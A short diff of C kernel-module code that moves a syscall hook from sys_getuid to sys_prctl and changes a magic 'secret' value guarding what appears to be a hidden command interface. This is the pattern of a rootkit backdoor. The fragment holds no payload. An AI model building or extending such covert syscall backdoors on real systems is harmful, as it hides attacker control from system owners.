@@ -41,12 +41,12 @@ static struct iface_command iface__commands[7] = {
   }
 };
 static struct sctm_hook iface__hook = {
-  .call = 102, /* `sys_getuid` */
+  .call = 157, /* `sys_prctl` */
   /* `.hook` is defined later on */
   /* `.hooked` is zeroed by the compiler */
   .unhook_method = SCTM_UNHOOK_METHOD_REPLACE
 };
-static unsigned long iface__secret = 0xDEADBEF0; /* ~0xDEADBEEF */
+static unsigned long iface__secret = 0xDEADBEEFDEADBEEF;
 
 unsigned long iface_hook_func(unsigned long secret, char __user *command,
     unsigned long arg0, unsigned long arg1, unsigned long arg2,
